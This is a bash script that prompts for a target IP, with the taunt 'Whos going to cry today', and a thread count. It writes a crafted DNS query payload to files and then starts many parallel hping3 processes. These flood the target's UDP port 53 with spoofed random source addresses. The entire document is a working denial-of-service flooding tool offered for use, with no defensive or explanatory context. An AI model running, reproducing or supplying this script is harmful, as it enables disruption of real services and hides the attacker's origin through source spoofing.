#! /bin/bash

echo "###################### DNS Payload to DNS port flood ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
do
python -c "import sys;
sys.stdout.write('\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01')" > dns_payload$i
hping3 $tarip --udp -p 53 --flood -I eth1 --rand-source -E dns_payload$i -d 28 &
done
